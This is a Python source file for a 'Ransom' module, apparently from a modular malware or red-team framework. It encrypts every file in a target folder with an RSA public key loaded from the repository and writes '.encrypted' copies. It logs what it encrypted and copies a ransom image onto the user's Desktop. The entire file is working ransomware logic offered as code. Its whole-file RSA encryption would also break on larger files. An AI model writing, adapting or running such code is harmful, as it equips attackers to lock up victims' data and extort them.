import os
import shutil

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey

from repo.modules.Base import Base


class Ransom(Base):
    """Module used to encrypt the current host"""

    def __init__(self, host) -> None:
        super().__init__(host)
        self.encryptSource = "../RansomEncryptFolder"
        self.encrypted_files = []
        self.public_key = self.get_public_key()

    def get_public_key(self) -> RSAPublicKey:
        """Get the public key from the repo"""
        with open(os.path.join("repo", "modules", "public_key.pem"), "rb") as key_file:
            public_key = serialization.load_pem_public_key(
                key_file.read()
            )

        return public_key

    def encrypt(self, file) -> bytes:
        """Encrypt a file"""
        with open(os.path.join(self.encryptSource, file), "rb") as f:
            file_contents = f.read()

        return self.public_key.encrypt(
            file_contents,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

    def run(self) -> None:
        """Encrypt the current host"""
        for file in os.listdir(self.encryptSource):
            if file not in self.encrypted_files and file[-10:] != ".encrypted":
                if os.path.isfile(os.path.join(self.encryptSource, file)):
                    print(f"Encrypting \"{file}\"")

                    encrypted = self.encrypt(file)

                    with open(os.path.join(self.encryptSource, file + ".encrypted"), "wb") as f:
                        f.write(encrypted)

                    self.encrypted_files.append(file)

        self.leave_ransom_note()

    def log(self) -> dict:
        """Return the encrypted files"""
        return {
            "encrypted_files_count": len(self.encrypted_files),
            "encrypted_files": self.encrypted_files
        }

    def leave_ransom_note(self) -> None:
        """Leave a ransom note on the current host"""
        ransom_file = os.path.join(os.path.expanduser('~'), "Desktop", "ransom.jpg")
        if not os.path.exists(ransom_file):
            shutil.copy(os.path.join(os.getcwd(), "repo", "modules", "ransom.jpg"), ransom_file)
